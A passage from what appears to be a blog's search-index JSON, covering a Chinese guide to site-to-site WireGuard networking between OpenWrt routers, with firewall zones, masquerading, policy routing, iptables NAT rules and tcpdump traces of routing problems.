\u7f51\u5173\u8fde\u63a5\u4e0d\u540c VPC \u7684\u4f18\u52bf\u548c\u65b9\u6cd5_\u4e13\u6709\u7f51\u7edc VPC-\u963f\u91cc\u4e91\u5e2e\u52a9\u4e2d\u5fc3 (aliyun.com)</p> <p>\u8fd9\u91cc\u5217\u51fa\u4e24\u79cd\u901a\u7528\u7f51\u7edc\u7ed3\u6784</p> <ul> <li>\u70b9\u5bf9\u70b9\u8fde\u63a5\u3002\u591a\u4e2a VPC \u95f4\u4e24\u4e24\u8fde\u63a5\uff0c\u4fdd\u8bc1\u5ef6\u8fdf\u6700\u4f4e</li> <li>\u661f\u578b\u7ed3\u6784\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u9700\u8981\u914d\u7f6e\u548c\u4e2d\u5fc3\u8282\u70b9\u7684\u8fde\u63a5 </li> </ul> <p></p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wggretap-\u4e8c\u5c42\u96a7\u9053","title":"wg+gretap \u4e8c\u5c42\u96a7\u9053","text":"<p>TODO</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#openwrt-\u5f02\u5730\u7ec4\u7f51\u5b9e\u4f8b","title":"openwrt \u5f02\u5730\u7ec4\u7f51\u5b9e\u4f8b","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u6211\u7684\u7f51\u7edc\u7ed3\u6784\u4f8b\u5b50","title":"\u6211\u7684\u7f51\u7edc\u7ed3\u6784\u4f8b\u5b50","text":"<p>\u4e09\u4e2a\u8def\u7531\u5668\u901a\u8fc7 wg \u4e24\u4e24\u8fde\u63a5\uff08\u5176\u5b9e\u4e0d\u4e00\u5b9a\u9700\u8981\u8fd9\u4e2a\u7ed3\u6784\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u6210 op2-op1-op3 \u8fd9\u79cd\u94fe\u72b6\u7ed3\u6784\uff0c\u8fd9\u79cd\u7ed3\u6784\u4e3b\u8981\u964d\u4f4e\u4e86\u4e00\u6b21\u8f6c\u53d1\uff0c\u5ef6\u8fdf\u4e00\u822c\u66f4\u77ed\uff09</p> <p></p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg-site-to-site-\u914d\u7f6e","title":"wg site to site \u914d\u7f6e","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u63a5\u53e3","title":"\u63a5\u53e3","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u65b0\u5efa wg_s2s \u63a5\u53e3</p> <ul> <li>\u534f\u8bae\u9009\u62e9 Wireguard VPN</li> <li>\u5206\u914d\u79c1\u6709\u5730\u5740</li> <li>\u914d\u7f6e\u597d\u76d1\u542c\u7aef\u53e3\uff08\u4e4b\u540e\u5728\u9632\u706b\u5899\u4e2d\u8bbe\u7f6e allow input\uff09</li> </ul> <p>\u4e24\u8fb9\u5747\u521b\u5efa\u597d\u540e\u518d\u76f8\u4e92\u6dfb\u52a0 peer</p> <p>op1  </p> <p>op2  </p> <p>op1 \u4e0a op2 peer \u8bbe\u7f6e\u4f8b\u5b50</p> <ul> <li>allowed ip \u586b\u5199 op2 wg_s2s \u63a5\u53e3\u8bbe\u7f6e\u7684\u79c1\u6709\u5730\u5740\uff0c\u5e76\u586b\u5199 op2 \u6240\u5728\u7684\u5b50\u7f51\u7f51\u6bb5</li> <li>route allow ip \u9700\u8981\u52fe\u9009\uff0c\u4f5c\u7528\u662f\u8ba9 openwrt \u6839\u636e allowed ip \u751f\u6210\u8def\u7531 </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u9632\u706b\u5899","title":"\u9632\u706b\u5899","text":"<p>\u4e24\u8fb9\u9700\u8981\u6dfb\u52a0\u4ee5\u4e0b\u9632\u706b\u5899\u89c4\u5219\uff0c\u4fdd\u8bc1 wg \u80fd\u4ece wan \u6b63\u5e38\u8fde\u63a5\u3002\u534f\u8bae\u52fe\u9009 UDP \u5373\u53ef </p> <p>\u7136\u540e\u662f\u5173\u4e8e zone \u7684\u8bbe\u7f6e\u3002</p> <p>wg_s2s \u63a5\u53e3\u53ef\u4ee5\u914d\u7f6e\u6210 lan zone\uff0c\u5728\u63a5\u53e3\u4e2d\u52fe\u9009 lan \u5373\u53ef\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002  \u8fd9\u6837\u540e\u9762\u7684 zone \u4e4b\u95f4\u8f6c\u53d1\u89c4\u5219\u5c31\u4e0d\u9700\u8981\u4fee\u6539\u3002\u4ee5\u4e0b\u6bb5\u843d\u53ef\u4ee5\u8df3\u8fc7\u3002</p> <p>\u4ee5\u4e0b\u8bbe\u7f6e\u9002\u5408\u5bf9\u9632\u706b\u5899\u539f\u7406\u611f\u5174\u8da3\u7684\u7528\u6237\uff1a</p> <p>\u4e3a wg_s2s \u5355\u72ec\u8bbe\u7f6e\u4e00\u4e2a\u9632\u706b\u5899 zone\uff0c\u53ef\u4ee5\u4f7f\u4ee5\u540e\u7684\u914d\u7f6e\u66f4\u7075\u6d3b\u3002</p> <p>op1 \u548c op2 lan,wan, wg_s2s zone \u7684\u8bbe\u7f6e\u5982\u4e0b\u56fe\uff1a</p> <ul> <li><code>lan -&gt; wan, wg_s2s</code>\uff1a\u8868\u793a\u4e00\u4e2a\u5c40\u57df\u7f51\u7684\u6d41\u91cf\u53ef\u4ee5\uff081\uff09\u8bbf\u95ee\u4e92\u8054\u7f51 (wan) \uff082\uff09\u901a\u8fc7 wg_s2s \u63a5\u53e3\u8bbf\u95ee\u5bf9\u9762\u5b50\u7f51 (wg_s2s)</li> <li><code>wg_s2s -&gt; lan</code>\uff1a\u8868\u793a\u5141\u8bb8\u4ece wg_s2s \u8fdb\u5165\u7684\u6d41\u91cf\uff08\u5bf9\u9762\u5b50\u7f51\u901a\u8fc7 wg_s2s\uff09\u53ef\u4ee5\u8bbf\u95ee\u672c\u5b50\u7f51<ul> <li>\u8fd9\u91cc\u8fd8\u5141\u8bb8\u4e86 wg_s2s -&gt; wan \u662f\u4e3a\u4e86\u53e6\u4e00\u4e2a\u5b50\u7f51\u901a\u8fc7\u672c\u5b50\u7f51\u8bbf\u95ee\u4e92\u8054\u7f51\u7684\u60c5\u51b5</li> </ul> </li> <li>wg_s2s \u7684masquerading\u53ef\u4ee5\u52fe\u9009\u4e5f\u53ef\u4ee5\u4e0d\u52fe\u9009<ul> <li>\u52fe\u9009\uff1a\u8868\u793a\u4ece wg_s2s \u51fa\u53bb\u7684\u6d41\u91cf\u4f1a\u7ecf\u8fc7 SNAT\uff0c\u5373\u5c06\u6e90\u5730\u5740\uff08\u53ef\u80fd\u662f lan \u8bbe\u5907\u7684\u5730\u5740\uff09\u6362\u4e3a wg_s2s \u7684\u5730\u5740\u3002\u8fd9\u6837\u4ece\u4e00\u4e2a\u5b50\u7f51\u8bbf\u95ee\u53e6\u4e00\u4e2a\u5b50\u7f51\u65f6\uff0c\u53e6\u4e00\u4e2a\u5b50\u7f51\u53ea\u80fd\u770b\u5230\u7ecf\u8fc7 NAT \u540e\u7684\u5730\u5740\uff0c\u800c\u4e0d\u77e5\u9053\u53d1\u8d77\u8bbe\u5907\u7684 lan \u5730\u5740\u3002</li> <li>\u4e0d\u52fe\u9009\uff1a\u597d\u5904\u5c31\u662f\u4e24\u4e2a\u5b50\u7f51\u76f8\u4e92\u8bbf\u95ee\u65f6\u80fd\u4fdd\u7559 ip \u4fe1\u606f\u3002\u7f3a\u70b9\u662f\u7531\u4e8e\u53ea\u4e3a wg_s2s \u8bbe\u7f6e\u4e86\u4e24\u8fb9 lan \u7f51\u6bb5\u7684\u8def\u7531\uff08\u4e0a\u4e00\u8282\u7684 allowed ip\uff09\uff0c\u4e00\u4e2a\u8def\u7531\u5668\u4e0a\u7684\u5176\u5b83\u63a5\u53e3\uff08\u5982 wg1\uff09\u65e0\u6cd5\u901a\u8fc7 wg_s2s \u8bbf\u95ee\u53e6\u5916\u4e00\u4e2a\u5b50\u7f51\u3002<ul> <li>\u6ca1\u6709\u592a\u591a\u63a5\u53e3\u7684\u7b80\u5355\u7f51\u7edc\u60c5\u51b5\u4e0b\uff0c\u5efa\u8bae\u662f\u4e0d\u52fe\u9009 </li> </ul> </li> </ul> </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u8def\u7531","title":"\u8def\u7531","text":"<p>\u4e0a\u9762 op2 \u5728\u6dfb\u52a0 op1 peer \u65f6\uff0callowed ip \u8bbe\u7f6e\u4e86 0.0.0.0/0\uff0c\u8868\u793a\u6240\u6709\u6d41\u91cf\u90fd\u8d70 wg_s2s \u51fa\u53bb\u3002\u5373 op2 \u901a\u8fc7 op1 \u4e0a\u7f51\u3002 </p> <p>wg_s2s peer \u8bbe\u7f6e\u597d allowed ip \u7684\u60c5\u51b5\u4e0b\uff0copenwrt \u5df2\u7ecf\u6b63\u786e\u751f\u6210\u4e86\u8def\u7531\u89c4\u5219\uff0c\u5982\u4e0b\u6240\u793a</p> <pre><code>root@op1 \u279c  ~ ip ro\n10.0.32.2 dev wg_s2s proto static scope link\n192.168.36.0/24 dev wg_s2s proto static scope link\n</code></pre> <pre><code>root@op2 \u279c  ~ ip ro\ndefault dev wg_s2s proto static scope link\n10.0.32.1 dev wg_s2s proto static scope link\n192.168.35.0/24 dev wg_s2s proto static scope link\n</code></pre> <p>\u4ee5\u4e0a\u5f02\u5730\u7ec4\u7f51\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e2a\u4ece\u5b50\u7f51\u8bbf\u95ee\u53e6\u4e00\u4e2a\u5b50\u7f51\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898-1\u539f\u8def\u8fd4\u56de","title":"\u95ee\u9898 1\uff1a\u539f\u8def\u8fd4\u56de","text":"<p>\u5982\u679c\u4e00\u4e2a\u5b50\u7f51\u901a\u8fc7\u53e6\u4e00\u4e2a\u5b50\u7f51\u4e0a\u7f51\uff08\u4e0a\u9762\u914d\u7f6e\u4e2d op2 \u901a\u8fc7 op1 \u4e0a\u7f51\uff09\uff0c\u5219\u4f1a\u9047\u5230\u4ee5\u4e0b\u95ee\u9898\uff1a \u4ece\u5916\u9762\u8bbf\u95ee op2 wan \u53e3\u7684 ipv4 \u5730\u5740\u65f6\uff0c\u8fd4\u56de\u7684\u5305\u5374\u4ece wg_s2s \u51fa\u53bb\u4e86\uff08\u9ed8\u8ba4\u8def\u7531\uff09\uff0c\u8fd9\u5bfc\u81f4\u65e0\u6cd5\u901a\u8fc7 wan \u8bbf\u95ee op2 \u4e86\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\uff1a\u6dfb\u52a0\u4e00\u6761\u6e90\u5730\u5740\u7684\u7b56\u7565\u8def\u7531\uff0c\u8868\u793a\u53ea\u8981 src \u5730\u5740\u662f wan \u53e3\u5730\u5740\uff0c\u5747\u4ece wan \u53e3\u51fa\u53bb\u3002</p> <pre><code>echo \"10 wan\" &gt;&gt; /etc/iproute2/rt_tables\n\nip ru add from &lt;wan_ip&gt; lookup wan prior 3\nip ro add default via &lt;gateway&gt; dev &lt;wan_dev&gt; proto static table wan\n</code></pre> <p>\u7ed3\u679c</p> <pre><code>root@op2 \u279c  ~ ip ru\n0:      from all lookup local\n3:      from xxx lookup wan\n32766:  from all lookup main\n32767:  from all lookup default\n\nroot@op2 \u279c  ~ ip ro show table wan\ndefault via yyy dev eth0 proto static\n</code></pre> <p>p.s: \u4e0d\u8fc7\u8be5\u539f\u8def\u8fd4\u56de\u4e5f\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u4ece lan \u8bbf\u95ee wan\uff08\u4e0d\u8fc7\u5e94\u8be5\u4e5f\u6ca1\u4eba\u4f1a\u8fd9\u4e48\u7528\u5427\uff09 \u4ece lan \u8bbf\u95ee wan \u65f6\uff0c\u4f1a\u7531\u4e8e\u7b56\u7565\u8def\u7531\uff08src \u5730\u5740\u4e3a wan \u5730\u5740\u65f6\u5168\u90e8\u4ece wan \u51fa\u53bb\uff09\u5c06\u54cd\u5e94\u4ece wan \u53d1\u51fa\u53bb\uff0c\u4ece\u800c\u65e0\u6cd5\u8bbf\u95ee</p> <pre><code>root@op1 \u279c  opkg tcpdump -ni any tcp and port 8000\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n19:07:00.982145 eth1  In  IP 192.168.35.2.50214 &gt; 114.214.236.72.8000: Flags [S], seq 1381384154, win 64240, options [mss 1460,sackOK,TS val 2655701923 ecr 0,nop,wscale 7], length 0\n19:07:00.982145 br-lan In  IP 192.168.35.2.50214 &gt; 114.214.236.72.8000: Flags [S], seq 1381384154, win 64240, options [mss 1460,sackOK,TS val 2655701923 ecr 0,nop,wscale 7], length 0\n19:07:00.982180 br-wan Out IP 114.214.236.72.8000 &gt; 192.168.35.2.50214: Flags [S.], seq 256274565, ack 1381384155, win 65160, options [mss 1460,sackOK,TS val 2164672905 ecr 2655701923,nop,wscale 7], length 0\n19:07:00.982181 eth0  Out IP 114.214.236.72.8000 &gt; 192.168.35.2.50214: Flags [S.], seq 256274565, ack 1381384155, win 65160, options [mss 1460,sackOK,TS val 2164672905 ecr 2655701923,nop,wscale 7], length 0\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898-2\u5176\u5b83\u63a5\u53e3\u8de8\u7f51\u7edc\u8bbf\u95ee","title":"\u95ee\u9898 2\uff1a\u5176\u5b83\u63a5\u53e3\u8de8\u7f51\u7edc\u8bbf\u95ee","text":"<p>\u4e4b\u524d\u63d0\u5230\uff0c\u5982\u679c wg_s2s \u4e0d\u8bbe\u7f6emasquerading\uff0c\u90a3\u4e48\u4e00\u4e2a\u8def\u7531\u5668\u4e0b\u9664\u4e86 lan \u5916\u7684\u5176\u5b83\u63a5\u53e3\uff0c\u5747\u65e0\u6cd5\u8bbf\u95ee\u5bf9\u9762\u8def\u7531\u5668\u7684\u5b50\u7f51\u3002</p> <p>\u6bd4\u5982\u901a\u5e38\u9700\u8981\u4e00\u4e2a wg0 \u7528\u4e8e\u4ece\u5916\u9762\u8fde\u63a5\u5230\u5185\u7f51\u3002\u800c\u8be5\u63a5\u53e3\u7684\u79c1\u6709\u5730\u5740\u548c wg_s2s \u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p>\u5728\u5f00\u542f\u4e86 masquerading \u65f6\uff0c\u4e0d\u4f1a\u51fa\u95ee\u9898\u3002\u6bd4\u5982\u624b\u673a\u901a\u8fc7 wg0 \u8fde\u56de op1\uff0c\u518d\u8bbf\u95ee op2 \u7684 lan\u3002\u7f51\u7edc\u5305\u7684\u8f6c\u53d1\u8fc7\u7a0b\u5982\u4e0b</p> <p></p> <p>\u89e3\u51b3\u8be5\u95ee\u9898\u7684\u65b9\u6cd5\u548c\u4e0a\u56fe\u662f\u4e00\u6837\u7684\uff0c\u5c31\u662f\u901a\u8fc7 iptable\uff0c\u53ea\u9488\u5bf9 wg1 \u6d41\u91cf\u901a\u8fc7 wg_s2s \u65f6\u8fdb\u884c SNAT</p> <pre><code>iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o wg_s2s -j MASQUERADE\n</code></pre> <p>\u8be5\u547d\u4ee4\u91cd\u542f\u540e\u5931\u6548\uff0c\u53ef\u4ee5\u628a\u5b83\u5199\u5165<code>/etc/rc.local</code>\uff0c\u5728 openwrt \u91cd\u542f\u540e\u81ea\u52a8\u8fd0\u884c\u3002</p> <p>\u66f4\u65b9\u4fbf\u7684\u662f\u76f4\u63a5\u4f7f\u7528 openwrt \u63d0\u4f9b\u7684 NAT \u8bbe\u7f6e\uff0c\u8bbe\u7f6e\u4f1a\u4fdd\u5b58\u5728<code>/etc/config/firewall</code>\u7684<code>nat</code> section \u4e2d\u3002 </p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg-\u5176\u5b83\u76f8\u5173\u95ee\u9898","title":"wg \u5176\u5b83\u76f8\u5173\u95ee\u9898","text":"<ul> <li>wg allowip \u53ef\u4ee5\u770b\u4f5c\u9632\u706b\u5899 input \u89c4\u5219\u3002</li> <li>wg allowip \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53c8\u4f1a\u4f5c\u4e3a\u8def\u7531\u89c4\u5219\uff0c\u8868\u793a\u54ea\u4e9b\u5730\u5740\u9700\u8981\u901a\u8fc7 wg \u63a5\u53e3\u8def\u7531\u51fa\u53bb<ul> <li>openwrt \u652f\u6301\u4e00\u4e2a\u9009\u9879\uff0c\u662f\u5426\u5f00\u542f\u901a\u8fc7 allow ip \u81ea\u52a8\u6dfb\u52a0\u8def\u7531\u8868</li> </ul> </li> </ul> <ul> <li>wg \u7684 allow ip \u540c\u65f6\u8bbe\u7f6e\u4e86\u9632\u706b\u5899<ul> <li>\u5bf9\u4e8e\u53d1\u5305\u6765\u8bf4\uff0callow ip \u662f\u8def\u7531\u3002\u5bf9\u4e8e\u6536\u5305\u6765\u8bf4\uff0callow ip \u662f\u9632\u706b\u5899\u3002\u800c\u6709\u65f6\u5019\u6211\u4eec\u5e0c\u671b\u8fd9\u4e24\u4e2a\u529f\u80fd\u662f\u5206\u5f00\u7684\u3002 wg0 allowed ip \u5982\u679c\u8bbe\u7f6e\u4e3a 10.0.31.102/32\uff0c\u5219\u8868\u793a\u5176\u5b83 src addr \u7684\u5305\u90fd\u4f1a\u88ab\u4e22\u5f03\u3002\u60f3\u8981\u5300\u901f\u4efb\u610f\u5305\uff0c\u9700\u8981\u8bbe\u7f6e\u4e3a 0.0.0.0/0\u3002\u5982\u4e0b\u663e\u793a\u4e86\u4e00\u4e2a wg0 \u63a5\u53e3\u63a5\u53d7\u5176\u5b83\u6d41\u91cf\u7684\u6548\u679c\u3002</li> </ul> </li> </ul> <pre><code>root@op1 \u279c  ~ tcpdump -ni any icmp and host 222.195.90.107\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n15:52:11.410653 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 561, length 64\n15:52:12.410918 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 562, length 64\n15:52:13.411181 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 563, length 64\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u65e0\u6cd5\u52a8\u6001\u8bbe\u7f6e\u8def\u7531","title":"\u65e0\u6cd5\u52a8\u6001\u8bbe\u7f6e\u8def\u7531","text":"<p>\u63a8\u8350\u7684\u529f\u80fd\uff0cpeer \u5efa\u7acb\u4e86\u8fde\u63a5\u65f6\uff0c\u624d\u8bbe\u7f6e\u8def\u7531\uff0c\u800c\u4e0d\u662f\u76ee\u524d\u7684\u63d0\u524d\u8bbe\u7f6e\u597d\u8def\u7531\u3002\u8fd9\u6837\u80fd\u7b80\u5316\u4ee5\u4e0b\u95ee\u9898\u7684\u89e3\u51b3\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898-1","title":"\u95ee\u9898 1","text":"<p>\u95ee\u9898\uff1a\u4e24\u4e2a op \u4e0a\u5747\u6709 wg0\uff0c\u7528\u4e8e\u624b\u673a\u7b49\u8bbe\u5907\u4ece\u5916\u7f51\u8fde\u56de\u3002\u4e3a\u4e86\u7b80\u5316\u914d\u7f6e\u6587\u4ef6\uff0c\u5206\u914d\u4e86\u76f8\u540c\u5730\u5740\u6bb5\uff0c\u56e0\u6b64\u4e24\u4e2a op \u7684 peer \u914d\u7f6e\u53ef\u4ee5\u590d\u7528\u3002\u7136\u800c\u8fd9\u5bfc\u81f4 client \u901a\u8fc7 wg0 \u8fde\u5165 op1 \u65f6\uff0c\u65e0\u6cd5\u8bbf\u95ee op2 \u7684\u7f51\u7edc\u3002\u56e0\u4e3a op2 \u4e0a\u6536\u5230\u5305\u8fd4\u56de\u65f6\uff0c\u4f1a\u4ece\u672c\u5730\u7684 wg0 \u51fa\u53bb\u3002</p> <p>\u5982\u679c wg \u652f\u6301\u52a8\u6001\u8def\u7531\uff0c\u90a3\u4e48\u76ee\u7684\u5730\u5740\u662f wg0 client \u7684\u5305\u5c31\u4e0d\u4f1a\u4ece\u672c\u5730 wg0 \u53d1\u51fa\u3002\u800c\u662f\u8d70\u9ed8\u8ba4\u8def\u7531\uff0c\u901a\u8fc7 op1-op2 \u95f4\u7684\u96a7\u9053\u53d1\u7ed9 op1\u3002</p> <p>\u901a\u8fc7 SNAT \u89e3\u51b3</p> <p>\u9488\u5bf9\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u79cd\u53ef\u63a5\u53d7\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff1a\u9488\u5bf9\u6e90\u5730\u5740\u662f wg0 \u7684\u5305\uff0c\u5bf9 wg_s2s \u51fa\u53bb\u7684\u6d41\u91cf\u8fdb\u884c SNAT</p> <ul> <li>\u7f3a\u70b9\u662f\uff0c\u8fd9\u6837\u4e00\u4e2a lan \u8bbf\u95ee\u53e6\u4e00\u4e2a lan \u65f6\uff0c\u662f\u770b\u4e0d\u5230\u7ec6\u8282\u7684\uff0c\u53ea\u80fd\u770b\u5230\u4e00\u4e2a\u8def\u7531\u5668\u8bbf\u95ee\u53e6\u4e00\u4e2a lan\u3002\u4e0d\u8fc7\u7531\u4e8e wg0 \u53ea\u662f\u5728\u5916\u4e34\u65f6\u4f7f\u7528\uff0c\u56e0\u6b64\u4e5f\u80fd\u63a5\u53d7\u3002</li> </ul> <pre><code>iptables -t nat -A POSTROUTING -s 10.0.31.0/24 -o wg_s2s -j MASQUERADE\niptables -t nat -A POSTROUTING -s 10.0.33.0/24 -o wg_s2s -j MASQUERADE\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898-2","title":"\u95ee\u9898 2","text":"<p>\u95ee\u9898 2\uff1a\u60f3\u8981\u628a wg \u5730\u5740\u4f5c\u4e3a\u67d0\u4e2a\u8bbe\u5907\u7ed1\u5b9a\u7684\u5730\u5740\u3002\u53ea\u8981\u8bbe\u5907\u901a\u8fc7 wg \u63a5\u5165\u5185\u7f51\uff0c\u90a3\u4e48\u5728\u81ea\u5df1\u7684\u7f51\u7edc\u4e2d\u4efb\u4f55\u5730\u65b9\u90fd\u80fd\u591f\u8bbf\u95ee\u8be5\u8bbe\u5907\u3002\u7136\u800c\u73b0\u5b9e\u662f\uff0c\u53ea\u6709\u8bbe\u5907\u8fde\u63a5\u7684\u90a3\u4e2a\u5b50\u7f51\u53ef\u4ee5\u8bbf\u95ee\u3002 \u56e0\u4e3a\u5728\u4e24\u4e2a op \u4e0a\u53ea\u8981\u8bbe\u7f6e\u4e86 peer\uff0c\u90a3\u4e48\u65e0\u8bba\u662f\u5426\u548c peer \u8fde\u63a5\uff0c\u90fd\u4f1a\u8bbe\u7f6e\u5230 peer \u7684\u8def\u7531\u3002\u8fd9\u4f7f\u5f97 op \u4e0a\u8bbf\u95ee wg0 \u65f6\uff0c\u4f1a\u4ece\u81ea\u5df1\u7684 wg0 \u53d1\u51fa\u3002</p> <p>\u53d1\u73b0\u9020\u6210\u8fd9\u4e2a\u7684\u539f\u56e0\u5728\u4e8e\uff0cwg \u65e0\u6cd5\u5728\u8fde\u63a5\u65f6\u52a8\u6001\u5730\u6dfb\u52a0\u8def\u7531\u8868\u3002\u5982\u679c\u662f peer \u8fde\u63a5 op1 \u65f6\uff0cop1 \u751f\u6210\u4e00\u6761\u8def\u7531\u8868\u3002\u800c op2 \u4e0a\u7531\u4e8e\u6ca1\u6709\u8fde\u63a5\uff0c\u4fbf\u6ca1\u6709\u5173\u4e8e peer wg0 \u5730\u5740\u7684\u8def\u7531\u8868\u3002\u56e0\u6b64 op2 \u4e0a\u8bbf\u95ee peer \u65f6\u5c31\u4f1a\u901a\u8fc7\u9ed8\u8ba4\u7f51\u5173\uff0c\u800c\u53ea\u9700\u8981\u5728 wg_s2s \u4e0a\u6dfb\u52a0\u4e00\u4e2a wg0/24 \u7684\u8def\u7531\u8868\u4fbf\u53ef\u4ee5\u4e00\u52b3\u6c38\u9038\u4e86\u3002</p> <p>\u59a5\u534f\u7684\u65b9\u6cd5 wg0 client \u540c\u65f6\u548c\u8fde\u63a5\u4e24\u4e2a op</p> <ul> <li>\u8fd9\u79cd\u5bf9\u4e8e\u6811\u8393\u6d3e\u8fd9\u79cd\u8fd8\u597d\uff0c\u5982\u679c\u662f\u624b\u673a\u53ef\u80fd\u5c31\u4e0d\u884c\u4e86\u3002</li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#ospf","title":"OSPF\uff1f","text":"<p>\u4e0a\u9762 3 \u4e2a\u5b50\u7f51\u901a\u8fc7 wg \u7ec4\u7f51\u65f6\uff0c\u9700\u8981\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\u8868\u3002\u6709\u6ca1\u6709\u4e00\u79cd\u65b9\u5f0f\uff0c\u5f7b\u5e95\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u914d\u7f6e\u5462\uff1f</p> <p>\u8fd9\u5176\u5b9e\u5c31\u662f\u8def\u7531\u534f\u8bae\u7684\u4f5c\u7528\uff0c\u907f\u514d\u624b\u52a8\u8bbe\u7f6e\u8def\u7531\uff0c\u800c\u662f\u8ba9\u8def\u7531\u5668\u81ea\u52a8\u5b66\u4e60\u8def\u7531\u8868\u3002\u5e38\u89c1\u7684\u8def\u7531\u534f\u8bae\u6709\uff1aRIP\uff0cOSPF\u3002\u4f46\u662fOSPF \u80fd\u5426\u8fd0\u884c\u5728 wg \u6784\u6210\u7684\u865a\u62df\u94fe\u8def\u4e0a\u5462\uff1f</p> <p>\u8def\u7531\u534f\u5b9a\uff08\u82f1\u8bed\uff1aRouting 